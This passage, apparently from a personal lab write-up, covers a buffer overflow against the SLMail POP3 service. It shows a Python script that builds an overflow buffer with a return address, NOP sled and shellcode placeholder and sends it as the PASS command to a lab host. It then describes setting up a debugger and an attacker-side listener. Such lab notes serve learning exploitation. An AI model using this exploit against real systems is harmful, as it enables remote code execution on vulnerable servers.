buffer = "A"*2606 + "\x8f\x35\x4a\x5f" +  "\x90"*16 + shellcode +"C"*(3500-2606-4-351-16)

try:
    print '\nSending evil buffer...'
    s.connect(('10.0.2.3',110))
    data = s.recv(1024)
    s.send('USER username' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print '\nDone!.'
except:
    print 'Could not connect to POP3!'

```

For the last time, after setting everything up, meaning attaching the slmail.exe process on immunity debugger ran as admin and setting the script and the listener on attacker's machine:

![](Attachments/Pasted%20image%2020260609184129.png)

One should note that a buffer overflow attack usually crashes the program after executing the code.

More buffer overflow practice can be done using vulnerable software on exploitdb website to get a better understanding of this vulnerability.
